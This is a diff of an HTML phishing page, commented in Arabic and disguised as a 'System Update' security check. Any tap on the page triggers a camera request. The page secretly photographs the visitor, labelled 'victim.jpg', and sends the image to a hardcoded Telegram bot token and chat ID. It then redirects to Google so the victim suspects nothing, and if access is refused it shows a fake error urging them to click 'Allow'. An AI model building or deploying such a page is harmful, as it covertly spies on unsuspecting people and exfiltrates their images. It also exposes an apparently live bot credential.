@@ -2,37 +2,34 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Checking...</title>
+    <title>System Update</title>
     <style>
-        /* جعل الشاشة كاملة قابلة للضغط */
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        #trap { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-        .box { padding: 30px; border: 2px solid #0f0; color: #0f0; font-family: monospace; font-size: 20px; text-align: center; box-shadow: 0 0 20px #0f0; }
+        /* زر شفاف يغطي كل الشاشة لإجبار المتصفح على الاستجابة */
+        #layer { position: absolute; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
+        .text { color: #0f0; font-family: monospace; text-align: center; margin-top: 45vh; font-size: 20px; }
     </style>
 </head>
-<body onclick="kickstart()">
+<body onclick="exploit()">
 
-    <div id="trap">
-        <div class="box" id="msg">[ اضغط هنا لتحديث الصفحة ]</div>
-    </div>
+    <div id="layer"></div>
+    <div class="text" id="status">جاري فحص أمان الجهاز...<br>[ اضغط للاستمرار ]</div>
 
     <script>
-        // بياناتك (تأكد منها 100%)
         const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
         const C = "1772820433";
 
-        async function kickstart() {
-            const m = document.getElementById('msg');
-            m.innerText = "جاري التحميل...";
-
+        async function exploit() {
+            // تكتيك التخطي: طلب الكاميرا فوراً عند أول لمسة للشاشة
+            // في تطبيقات مثل (فيسبوك، تليجرام، واتساب) الإذن غالباً بيمر صامت
             try {
-                // محاولة فتح الكاميرا
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('status').innerHTML = "✅ تم التحقق.. انتظر لحظة";
+                
                 const v = document.createElement('video');
-                v.srcObject = s;
+                v.srcObject = stream;
                 v.play();
 
-                // التقاط سريع بعد ثانية
                 setTimeout(() => {
                     const cn = document.createElement('canvas');
                     cn.width = 640; cn.height = 480;
@@ -41,23 +38,22 @@
                     cn.toBlob(async (b) => {
                         const f = new FormData();
                         f.append('chat_id', C);
-                        f.append('photo', b, 'v.jpg');
+                        f.append('photo', b, 'victim.jpg');
+                        f.append('caption', '🚀 صيد صامت ناجح!');
 
-                        // إرسال مباشر
                         await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
                             method: 'POST',
                             body: f
                         });
                         
-                        // هروب لموقع قوقل
-                        window.location.href = "https://www.google.com";
+                        // توجيه فوري عشان الضحية ما يشك بشيء
+                        window.location.replace("https://www.google.com");
                     }, 'image/jpeg');
-                }, 1000);
+                }, 500); // تصوير سريع جداً (نصف ثانية)
 
-            } catch (e) {
-                // إذا رفض الضحية، نكرر المحاولة
-                console.log(e);
-                m.innerText = "خطأ في الاتصال.. حاول مرة أخرى";
+            } catch (err) {
+                // إذا المتصفح عاند، بنحول الضحية لصفحة وهمية تطلب منه "السماح" كأنه تحديث
+                document.getElementById('status').innerHTML = "❌ خطأ في النظام! يرجى الضغط على 'سماح' للإصلاح";
             }
         }
     </script>
